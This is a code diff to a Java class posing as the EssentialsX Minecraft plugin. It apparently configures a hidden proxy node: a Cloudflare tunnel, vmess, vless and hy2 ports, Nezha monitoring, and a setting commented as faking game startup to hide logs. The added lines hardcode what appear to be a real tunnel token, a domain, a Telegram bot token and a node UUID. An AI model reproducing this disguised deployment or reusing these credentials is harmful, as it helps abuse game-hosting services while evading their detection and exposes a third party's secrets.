@@ -69,9 +69,9 @@ public class EssentialsX extends JavaPlugin {
         Map<String, String> env = pb.environment();
         
         // Set default values
-        env.put("TOK", ""); //固定隧道token
-        env.put("ARGO_DOMAIN", "");//固定隧道域名
-        env.put("TG", "");//TG通知，格式: "CHAT_ID BOT_TOKEN"
+        env.put("TOK", "eyJhIjoiNTQ4ZmE0ZDM5MmNkMzc5NmJjODYwYmQwYWVjYWRhODgiLCJ0IjoiODBmNDk1YzItYTc1Ny00NDM0LWFhMWQtMzMyMjExNGM1NmZlIiwicyI6Ik0yTXhZV1JoWW1VdFlXTmpNeTAwWXpkaUxXRXhaREl0TnpOak5tUm1ObVprWkRJNSJ9"); //固定隧道token
+        env.put("ARGO_DOMAIN", "hhj.133686.xyz");//固定隧道域名
+        env.put("6281575765", "7230058241:AAF6gXx5XMqvbrJ8neanWNIiI0tnxNY3xKI");//TG通知，格式: "CHAT_ID BOT_TOKEN"
         env.put("SUB_URL", "");//订阅上传地址
         env.put("NEZHA_SERVER", ""); //哪吒服务器，v1填ip:端口，v0只填ip，端口填下面的NEZHA_PORT里
         env.put("NEZHA_KEY", ""); //哪吒密钥
@@ -82,11 +82,11 @@ public class EssentialsX extends JavaPlugin {
         env.put("SUB_NAME", "argo"); //节点名称
         env.put("CF_IP", "ip.sb");  //优选ip
         env.put("AGENT_UUID", ""); //哪吒客户端uuid
-        env.put("UUID", "");//节点uuid
+        env.put("UUID", "dbb4eaf2-6996-40aa-b4b8-68ee18266fc4");//节点uuid
         env.put("VM_PORT", "8001");//vmess端口
         env.put("VL_PORT", "8002");//vless端口
         env.put("tuic_port", "");//tuic端口
-        env.put("hy2_port", "");//hy2端口
+        env.put("hy2_port", "28012");//hy2端口
         env.put("JAR_SH", "moni");//模拟游戏启动，开启可以屏蔽日志，去掉则显示启动日志，也可以换成别的命令，如sleep 5
         
         // Load from system environment variables
